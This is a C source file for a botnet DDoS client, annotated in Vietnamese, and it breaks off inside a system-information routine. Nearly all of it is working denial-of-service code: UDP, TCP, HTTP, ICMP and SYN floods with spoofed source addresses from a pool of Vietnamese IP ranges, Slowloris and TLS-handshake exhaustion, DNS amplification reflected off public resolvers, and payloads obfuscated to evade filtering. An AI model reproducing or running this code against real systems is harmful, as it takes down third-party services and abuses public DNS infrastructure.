#define _GNU_SOURCE
/*
 * ============================================================
 * ULTIMATE LINUX BOT — Tích hợp toàn bộ fjium-* + bot_v3
 * ============================================================
 * Compile:
 *   gcc -O3 -std=c11 -pthread -march=native bot.c -o bot -lssl -lcrypto -lz
 *   gcc -O3 -std=c11 -static -pthread bot.c -o bot_static -lssl -lcrypto -lz -ldl -lpthread
 *
 * Tích hợp:
 *   fjium-pps:  sendmmsg MEGA_BATCH, MSG_ZEROCOPY, SO_SNDBUFFORCE, mmap ring
 *   fjium-hex:  8 socket/thread, aligned_alloc, bypass patterns, SO_PRIORITY
 *   fjium-dns:  Pre-gen DNS payloads, multi-process, burst tuning
 *   fjium-gudp: sendmmsg burst, adaptive burst, 10000 payload pool
 *   fjium-bypass: VN IP pool, DNS/NTP/SSDP amp, payload encrypt/obfuscate
 *   bot_v3:     SYN flood, Slowloris, TLS exhaust, HTTP mutate, C2 WebSocket
 * ============================================================
 * Methods: UDP | TCP | HTTP | SYN | ICMP | MIX | SLOWLORIS | TLS_EXHAUST | DNS_AMP | GAME_MIMIC | MEGA
 * ============================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <net/if.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <ifaddrs.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <zlib.h>

/* ── Constants ─────────────────────────────────── */
#define MAX_PAYLOAD     1472
#define BURST_SIZE      512
#define MEGA_BATCH      65535
#define SOCKETS_PER_THREAD 8
#define THREAD_MULTIPLIER 2
#define MAX_SOCKETS      65535
#define BURST_MULTIPLIER 64
#define RING_BUF_SIZE    1048576
#define SOCKET_BUF_SIZE  (128 * 1024 * 1024)
#define MAX_PAYLOADS     10000
#define MAX_PROCESSES    4

/* ── VN IP Pool ────────────────────────────────── */
typedef struct { uint32_t base; uint32_t mask; } vn_ip_t;
static const vn_ip_t VN_POOL[] = {
    {0x0ea00000,0xffe00000},{0x0ee00000,0xffe00000},{0x1b400000,0xfff00000},
    {0x2a700000,0xfff00000},{0x71a00000,0xffe00000},{0x71b90000,0xffff0000},
    {0x73480000,0xfff80000},{0x74600000,0xfff00000},{0x75000000,0xfff00000},
    {0x76440000,0xfffc0000},{0x7b100000,0xfff00000},{0x7dd48000,0xffff8000},
    {0xabe00000,0xffe00000},{0xcba20000,0xffff0000},{0x1b480000,0xfff80000},
    {0x73490000,0xffff0000},{0x734a0000,0xfffe0000},{0x734c0000,0xfffc0000},
    {0x73540000,0xfffc0000},{0x74680000,0xfffc0000},{0x75010000,0xffff0000},
    {0x75020000,0xfffe0000},{0x75040000,0xfffc0000},{0xabe80000,0xfffc0000},
    {0x2a010000,0xffff0000},{0x2a710000,0xffff0000},{0x76450000,0xffff0000},
    {0x76460000,0xfffe0000},{0xb7500000,0xffff0000},{0xb7510000,0xffff8000},
    {0x704e0000,0xffff0000},{0x70c50000,0xffff0000},{0x75678000,0xffff8000},
};
#define VN_POOL_SZ (sizeof(VN_POOL)/sizeof(VN_POOL[0]))
static inline uint32_t rand_vn_ip(void) {
    static __thread unsigned int seed = 0;
    if (!seed) seed = time(NULL) ^ (unsigned long)pthread_self();
    const vn_ip_t *r = &VN_POOL[rand_r(&seed) % VN_POOL_SZ];
    return r->base | (rand_r(&seed) & ~r->mask);
}

/* ── Bypass Payload Patterns ───────────────────── */
static const unsigned char DNS_QUERY[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01";
static const unsigned char DNS_ANY[]   = "\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06govdot\x03com\x00\x00\xFF\x00\x01";
static const unsigned char NTP_REQ[]   = "\x1b\x00\x00\x00\x00\x00\x00\x00";
static const unsigned char SSDP_REQ[]  = "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\n\r\n";

static const char *UA[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.6778.135 Mobile Safari/537.36",
};
#define UA_N (sizeof(UA)/sizeof(UA[0]))

/* ── Global Payload Pool ───────────────────────── */
static unsigned char payloads[MAX_PAYLOADS][MAX_PAYLOAD];
static int payload_lens[MAX_PAYLOADS];
static int total_payloads = 0;

/* ── Config ────────────────────────────────────── */
typedef struct {
    char c2_host[256];
    int  c2_port;
    char c2_path[256];
    int  use_ssl;
    int  heartbeat_int;
    int  reconnect_min, reconnect_max, stale_timeout;
    unsigned int default_pps, default_threads;
    unsigned int spoof_mode, fragmentation;
    char bot_version[32];
} Config;

typedef struct {
    char hwid[32], ip_addr[64], os_ver[128];
    int cpu_cores, ram_mb, net_mbps;
} SysInfo;

typedef struct {
    char target[256];
    int  port;
    char method[32];
    int  duration_secs;
    unsigned int max_pps, max_threads;
    unsigned int spoof_mode, fragmentation;
    unsigned int slowloris, tls_exhaust, dns_amp, game_mimic, mega_mode;
} AttackParams;

/* ── Forward decls ─────────────────────────────── */
static uint16_t ip_csum(void *d, size_t l);
static uint16_t tcp_csum(void *ip, void *tcp);
static void   gen_payloads(void);
static void   gen_http(unsigned char *buf, int *len, const char *host);
static void   gen_tls_hello(unsigned char *buf, int *len, const char *sni);
static void   gen_game_pkt(unsigned char *buf, int *len);
static void   encrypt_payload(unsigned char *buf, int len);
static void   obfuscate_payload(unsigned char *buf, int len);

/* ── Token Bucket ──────────────────────────────── */
typedef struct {
    double rate, burst, tokens;
    struct timespec last;
    pthread_mutex_t mtx;
} TokenBucket;

static void tb_init(TokenBucket *tb, double r, double b) {
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}
static int tb_consume(TokenBucket *tb, int n) {
    pthread_mutex_lock(&tb->mtx);
    struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
    double elapsed = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens = (tb->burst < tb->tokens + elapsed * tb->rate) ? tb->burst : (tb->tokens + elapsed * tb->rate);
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

/* ── Socket Helpers ────────────────────────────── */
static int create_udp_socket(void) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int buf = SOCKET_BUF_SIZE, opt = 1;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &opt, sizeof(opt));
    int prio = 6;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
    int tos = 0x10;
    setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    fcntl(s, F_SETFL, O_NONBLOCK);
    return s;
}

static int create_raw_socket(int proto) {
    int s = socket(AF_INET, SOCK_RAW, proto);
    if (s < 0) return -1;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int buf = SOCKET_BUF_SIZE;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    return s;
}

/* ── MEGA Engine (fjium-pps integration) ───────── */
typedef struct {
    int *socks;
    int sock_count;
    struct sockaddr_in target;
    int duration;
    int cpu_id;
    unsigned char *ring;
    struct mmsghdr *msgs;
    struct iovec *iovs;
} MegaThread;

static void *mega_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % get_nprocs(), &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    mt->msgs = mmap(NULL, sizeof(struct mmsghdr) * MEGA_BATCH,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mt->iovs = mmap(NULL, sizeof(struct iovec) * MEGA_BATCH,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    mt->ring = mmap(NULL, RING_BUF_SIZE,
                    PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memset(mt->ring, 0, RING_BUF_SIZE);

    for (int i = 0; i < MEGA_BATCH; i++) {
        mt->iovs[i].iov_base = &mt->ring[i & (RING_BUF_SIZE - 1)];
        mt->iovs[i].iov_len = 0;
        mt->msgs[i].msg_hdr.msg_iov = &mt->iovs[i];
        mt->msgs[i].msg_hdr.msg_iovlen = 1;
        mt->msgs[i].msg_hdr.msg_name = &mt->target;
        mt->msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
        mt->msgs[i].msg_hdr.msg_control = NULL;
        mt->msgs[i].msg_hdr.msg_controllen = 0;
        mt->msgs[i].msg_hdr.msg_flags = 0;
    }

    time_t start = time(NULL);
    while (time(NULL) - start < mt->duration) {
        for (int s = 0; s < mt->sock_count; s++)
            for (int b = 0; b < BURST_MULTIPLIER; b++)
                sendmmsg(mt->socks[s], mt->msgs, MEGA_BATCH, MSG_DONTWAIT | MSG_NOSIGNAL | MSG_ZEROCOPY);
    }

    munmap(mt->msgs, sizeof(struct mmsghdr) * MEGA_BATCH);
    munmap(mt->iovs, sizeof(struct iovec) * MEGA_BATCH);
    munmap(mt->ring, RING_BUF_SIZE);
    return NULL;
}

/* ── Attack Workers ────────────────────────────── */
static void udp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return;
    int bs = 256 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));

    unsigned char *buf = aligned_alloc(64, MAX_PAYLOAD);
    struct iovec iov = {buf, 0};
    struct mmsghdr msg = {{&ta, sizeof(ta), &iov, 1, 0, 0, 0}, 0};
    unsigned int seed = time(NULL) ^ (unsigned long)pthread_self();

    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < BURST_SIZE; b++) {
            if (!tb_consume(tb, 1)) { usleep(50); break; }
            int idx = rand_r(&seed) % total_payloads;
            int len = payload_lens[idx];
            memcpy(buf, payloads[idx], len);
            iov.iov_len = len;
            sendmmsg(s, &msg, 1, MSG_DONTWAIT);
        }
    }
    free(buf); close(s);
}

static void syn_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    int s = create_raw_socket(IPPROTO_TCP);
    if (s < 0) return;

    struct { struct iphdr ip; struct tcphdr tcp; } pkt = {};
    pkt.ip.version = 4; pkt.ip.ihl = 5;
    pkt.ip.tot_len = htons(sizeof(pkt));
    pkt.ip.protocol = IPPROTO_TCP;
    pkt.ip.daddr = ta.sin_addr.s_addr;
    pkt.tcp.dest = htons(p->port);
    pkt.tcp.doff = 5; pkt.tcp.syn = 1;
    pkt.tcp.window = htons(65535);

    unsigned int seed = time(NULL) ^ (unsigned long)pthread_self();
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = pkt.tcp.dest;
    sin.sin_addr.s_addr = pkt.ip.daddr;

    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < BURST_SIZE; b++) {
            if (!tb_consume(tb, 1)) { usleep(50); break; }
            pkt.ip.id = htons(rand_r(&seed));
            pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip() : rand_r(&seed);
            pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
            pkt.ip.frag_off = (p->fragmentation && rand_r(&seed) % 4 == 0)
                ? htons(0x2000 | (rand_r(&seed) % 64)) : 0;
            pkt.tcp.source = htons(1024 + (rand_r(&seed) % 64511));
            pkt.tcp.seq = htonl(rand_r(&seed));
            pkt.ip.check = 0;
            pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = 0;
            pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
            sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(s);
}

static void tcp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int f = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            close(s);
        }
    }
}

static void http_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 30; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            unsigned char buf[2048]; int len;
            gen_http(buf, &len, p->target);
            send(s, buf, len, MSG_DONTWAIT);
            close(s);
        }
    }
}

static void slowloris(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    int *socks = calloc(500, sizeof(int));
    int cnt = 0;
    for (int i = 0; i < 500 && *(volatile int *)&p->duration_secs; i++) {
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s < 0) continue;
        fcntl(s, F_SETFL, O_NONBLOCK);
        connect(s, (struct sockaddr *)&ta, sizeof(ta));
        char ph[512];
        snprintf(ph, sizeof(ph), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", p->target);
        send(s, ph, strlen(ph), MSG_DONTWAIT);
        socks[cnt++] = s;
        usleep(50000 + rand() % 200000);
    }
    while (*(volatile int *)&p->duration_secs) {
        for (int i = 0; i < cnt; i++) {
            if (!tb_consume(tb, 1)) { usleep(100000); continue; }
            char h[256];
            snprintf(h, sizeof(h), "X-Ka-%d: %d\r\n", rand() % 99999, rand());
            send(socks[i], h, strlen(h), MSG_DONTWAIT);
            usleep(10000000 + rand() % 15000000);
        }
        if (cnt < 500) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s >= 0) {
                fcntl(s, F_SETFL, O_NONBLOCK);
                connect(s, (struct sockaddr *)&ta, sizeof(ta));
                char ph[512];
                snprintf(ph, sizeof(ph), "GET / HTTP/1.1\r\nHost: %s\r\n", p->target);
                send(s, ph, strlen(ph), MSG_DONTWAIT);
                socks[cnt++] = s;
            }
        }
    }
    for (int i = 0; i < cnt; i++) close(socks[i]);
    free(socks);
}

static void tls_exhaust(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 20; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            fcntl(s, F_SETFL, O_NONBLOCK);
            connect(s, (struct sockaddr *)&ta, sizeof(ta));
            unsigned char buf[1024]; int len;
            gen_tls_hello(buf, &len, p->target);
            send(s, buf, len, MSG_DONTWAIT);
            close(s);
        }
    }
}

static void dns_amp(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    const char *dns_svrs[] = {"203.162.4.1","203.113.131.1","210.245.0.11","8.8.8.8","1.1.1.1"};
    int dc = 5;
    int s = create_raw_socket(IPPROTO_UDP);
    if (s < 0) return;
    unsigned int seed = time(NULL) ^ (unsigned long)pthread_self();

    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            const char *dip = dns_svrs[rand_r(&seed) % dc];
            struct { struct iphdr ip; struct udphdr udp; unsigned char d[32]; } pkt = {};
            size_t tl = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_ANY);
            pkt.ip.version = 4; pkt.ip.ihl = 5;
            pkt.ip.tot_len = htons(tl);
            pkt.ip.id = htons(rand_r(&seed));
            pkt.ip.ttl = 64;
            pkt.ip.protocol = IPPROTO_UDP;
            pkt.ip.saddr = ta.sin_addr.s_addr;
            inet_pton(AF_INET, dip, &pkt.ip.daddr);
            pkt.ip.check = 0;
            pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
            pkt.udp.source = htons(53);
            pkt.udp.dest = htons(53);
            pkt.udp.len = htons(sizeof(struct udphdr) + sizeof(DNS_ANY));
            pkt.udp.check = 0;
            memcpy(pkt.d, DNS_ANY, sizeof(DNS_ANY));
            struct sockaddr_in sin;
            sin.sin_family = AF_INET;
            sin.sin_port = pkt.udp.dest;
            sin.sin_addr.s_addr = pkt.ip.daddr;
            sendto(s, &pkt, tl, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(s);
}

static void game_mimic(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return;
    int bs = 256 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    unsigned char buf[256]; int len;

    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            gen_game_pkt(buf, &len);
            sendto(s, buf, len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
        }
    }
    close(s);
}

static void icmp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    int s = create_raw_socket(IPPROTO_ICMP);
    if (s < 0) return;
    unsigned char icmp[1024] = {0};
    icmp[0] = 8;

    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 100; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            sendto(s, icmp, sizeof(icmp), MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
        }
    }
    close(s);
}

static void mixed(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb) {
    int us = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int rs = create_raw_socket(IPPROTO_TCP);
    if (us < 0 || rs < 0) { if (us >= 0) close(us); if (rs >= 0) close(rs); return; }
    int bs = 256 * 1024;
    setsockopt(us, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    unsigned int seed = time(NULL) ^ (unsigned long)pthread_self();

    while (*(volatile int *)&p->duration_secs) {
        for (int b = 0; b < 50; b++) {
            if (!tb_consume(tb, 1)) { usleep(100); break; }
            int c = rand_r(&seed) % 6;
            if (c == 0) {
                unsigned char buf[MAX_PAYLOAD];
                int idx = rand_r(&seed) % total_payloads;
                sendto(us, payloads[idx], payload_lens[idx], MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
            } else if (c == 1) {
                struct { struct iphdr ip; struct tcphdr tcp; } pkt = {};
                pkt.ip.version = 4; pkt.ip.ihl = 5;
                pkt.ip.tot_len = htons(sizeof(pkt));
                pkt.ip.id = htons(rand_r(&seed));
                pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
                pkt.ip.protocol = IPPROTO_TCP;
                pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip() : rand_r(&seed);
                pkt.ip.daddr = ta.sin_addr.s_addr;
                pkt.tcp.source = htons(1024 + (rand_r(&seed) % 64511));
                pkt.tcp.dest = htons(p->port);
                pkt.tcp.seq = htonl(rand_r(&seed));
                pkt.tcp.doff = 5; pkt.tcp.syn = 1;
                pkt.tcp.window = htons(65535);
                pkt.ip.check = 0;
                pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
                pkt.tcp.check = 0;
                pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
                struct sockaddr_in sin;
                sin.sin_family = AF_INET;
                sin.sin_port = pkt.tcp.dest;
                sin.sin_addr.s_addr = pkt.ip.daddr;
                sendto(rs, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin));
            } else if (c == 2) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[2048]; int len;
                    gen_http(buf, &len, p->target);
                    send(s, buf, len, MSG_DONTWAIT);
                    close(s);
                }
            } else if (c == 3) {
                unsigned char buf[256]; int len;
                gen_game_pkt(buf, &len);
                sendto(us, buf, len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta));
            } else if (c == 4) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    unsigned char buf[1024]; int len;
                    gen_tls_hello(buf, &len, p->target);
                    send(s, buf, len, MSG_DONTWAIT);
                    close(s);
                }
            } else {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s >= 0) {
                    fcntl(s, F_SETFL, O_NONBLOCK);
                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
                    close(s);
                }
            }
        }
    }
    close(us); close(rs);
}

/* ── Payload Generators ────────────────────────── */
static void gen_payloads(void) {
    unsigned int s = time(NULL);
    total_payloads = 0;

    /* DNS payloads */
    memcpy(payloads[total_payloads], DNS_QUERY, sizeof(DNS_QUERY));
    payload_lens[total_payloads++] = sizeof(DNS_QUERY);
    memcpy(payloads[total_payloads], DNS_ANY, sizeof(DNS_ANY));
    payload_lens[total_payloads++] = sizeof(DNS_ANY);

    /* NTP, SSDP */
    memcpy(payloads[total_payloads], NTP_REQ, sizeof(NTP_REQ));
    payload_lens[total_payloads++] = sizeof(NTP_REQ);
    memcpy(payloads[total_payloads], SSDP_REQ, sizeof(SSDP_REQ));
    payload_lens[total_payloads++] = sizeof(SSDP_REQ);

    /* Random hex payloads */
    for (int i = 0; i < MAX_PAYLOADS - 4 && total_payloads < MAX_PAYLOADS; i++) {
        int len = 200 + (rand_r(&s) % (MAX_PAYLOAD - 200));
        for (int j = 0; j < len; j++)
            payloads[total_payloads][j] = (unsigned char)(rand_r(&s) % 256);
        if (rand_r(&s) % 3 == 0)
            encrypt_payload(payloads[total_payloads], len);
        if (rand_r(&s) % 2 == 0)
            obfuscate_payload(payloads[total_payloads], len);
        payload_lens[total_payloads++] = len;
    }
}

static void gen_http(unsigned char *buf, int *len, const char *host) {
    unsigned int s = time(NULL) ^ (unsigned long)pthread_self();
    const char *methods[] = {"GET","POST","HEAD"};
    const char *paths[] = {"/","/index.html","/api/v1/status","/wp-admin/admin-ajax.php",
        "/assets/app.js","/images/logo.png","/favicon.ico","/api/health","/graphql"};
    const char *m = methods[rand_r(&s) % 3];
    const char *p = paths[rand_r(&s) % 9];
    char qs[64] = "";
    if (rand_r(&s) % 2) snprintf(qs, sizeof(qs), "?v=%u", rand_r(&s) % 1000000000);
    char xff[64] = "";
    if (rand_r(&s) % 4 == 0) {
        uint32_t vn = rand_vn_ip();
        snprintf(xff, sizeof(xff), "X-Forwarded-For: %d.%d.%d.%d\r\n",
            (vn >> 24) & 0xFF, (vn >> 16) & 0xFF, (vn >> 8) & 0xFF, vn & 0xFF);
    }
    *len = snprintf((char *)buf, 2048,
        "%s %s%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
        "Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8\r\n"
        "Accept-Encoding: gzip, deflate\r\n%s%sConnection: keep-alive\r\n\r\n",
        m, p, qs, host, UA[rand_r(&s) % UA_N],
        rand_r(&s) % 2 ? "Cache-Control: no-cache\r\n" : "",
        xff);
}

static void gen_tls_hello(unsigned char *buf, int *len, const char *sni) {
    unsigned int s = time(NULL) ^ (unsigned long)pthread_self();
    int pos = 0;
    buf[pos++] = 0x16; buf[pos++] = 0x03; buf[pos++] = 0x01;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    int len_pos = pos; pos += 3;
    int body_start = pos;
    buf[pos++] = 0x03; buf[pos++] = 0x03;
    for (int i = 0; i < 32; i++) buf[pos++] = rand_r(&s) & 0xFF;
    buf[pos++] = 0x00;
    uint16_t cs[] = {0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F};
    buf[pos++] = 0x00; buf[pos++] = sizeof(cs);
    for (size_t i = 0; i < sizeof(cs) / 2; i++) {
        buf[pos++] = (cs[i] >> 8) & 0xFF;
        buf[pos++] = cs[i] & 0xFF;
    }
    buf[pos++] = 0x01; buf[pos++] = 0x00;
    int ext_start = pos;
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    int sni_len = strlen(sni);
    buf[pos++] = 0x00; buf[pos++] = sni_len + 3;
    buf[pos++] = 0x00; buf[pos++] = sni_len;
    memcpy(buf + pos, sni, sni_len); pos += sni_len;
    buf[pos++] = 0x00; buf[pos++] = 0x2b;
    buf[pos++] = 0x00; buf[pos++] = 0x03; buf[pos++] = 0x03; buf[pos++] = 0x04;
    buf[pos++] = 0x00; buf[pos++] = 0x33;
    buf[pos++] = 0x00; buf[pos++] = 0x26; buf[pos++] = 0x00; buf[pos++] = 0x24;
    buf[pos++] = 0x00; buf[pos++] = 0x1d; buf[pos++] = 0x00; buf[pos++] = 0x20;
    for (int i = 0; i < 32; i++) buf[pos++] = rand_r(&s) & 0xFF;
    int ext_len = pos - ext_start - 2;
    buf[ext_start] = (ext_len >> 8) & 0xFF;
    buf[ext_start + 1] = ext_len & 0xFF;
    int body_len = pos - body_start;
    buf[len_pos] = (body_len >> 16) & 0xFF;
    buf[len_pos + 1] = (body_len >> 8) & 0xFF;
    buf[len_pos + 2] = body_len & 0xFF;
    int rec_len = pos - 3;
    buf[3] = (rec_len >> 8) & 0xFF;
    buf[4] = rec_len & 0xFF;
    *len = pos;
}

static void gen_game_pkt(unsigned char *buf, int *len) {
    unsigned int s = time(NULL) ^ (unsigned long)pthread_self();
    buf[0] = 0xFE; buf[1] = 0xFD;
    for (int i = 2; i < 8; i++) buf[i] = rand_r(&s) & 0xFF;
    int extra = (rand_r(&s) % 128) + 16;
    for (int i = 8; i < 8 + extra; i++) buf[i] = rand_r(&s) & 0xFF;
    *len = 8 + extra;
}

static void encrypt_payload(unsigned char *buf, int len) {
    uint8_t key = rand() % 256;
    for (int i = 0; i < len; i++) {
        buf[i] ^= key;
        key = (key + 1) % 256;
    }
}

static void obfuscate_payload(unsigned char *buf, int len) {
    for (int i = 0; i < len; i++)
        buf[i] = (buf[i] << 4) | (buf[i] >> 4);
}

/* ── Checksums ─────────────────────────────────── */
static uint16_t ip_csum(void *d, size_t l) {
    uint16_t *p = (uint16_t *)d;
    uint32_t a = 0;
    for (size_t i = 0; i < l / 2; i++) a += p[i];
    if (l & 1) a += ((uint8_t *)d)[l - 1];
    while (a >> 16) a = (a & 0xFFFF) + (a >> 16);
    return ~a;
}

static uint16_t tcp_csum(void *ip, void *tcp) {
    struct iphdr *iph = (struct iphdr *)ip;
    struct tcphdr *tcph = (struct tcphdr *)tcp;
    struct { uint32_t sa, da; uint8_t z; uint8_t pr; uint16_t tl; }
        ps = {iph->saddr, iph->daddr, 0, IPPROTO_TCP, htons(sizeof(struct tcphdr))};
    uint32_t a = 0;
    uint16_t *p = (uint16_t *)&ps;
    for (size_t i = 0; i < sizeof(ps) / 2; i++) a += p[i];
    p = (uint16_t *)tcp;
    for (size_t i = 0; i < sizeof(struct tcphdr) / 2; i++) a += p[i];
    while (a >> 16) a = (a & 0xFFFF) + (a >> 16);
    return ~a;
}

/* ── System Info ───────────────────────────────── */
static void sys_info(SysInfo *info) {
    char raw[4096] = {0};
    FILE *ci = fopen("/proc/cpuinfo", "r");
    if (ci) {
        char line[256];
        while (fgets(line, sizeof(line), ci))
            if (strstr(line, "Serial") || strstr(line, "cpu cores"))
                strcat(raw, line);
        fclose(ci);
    }
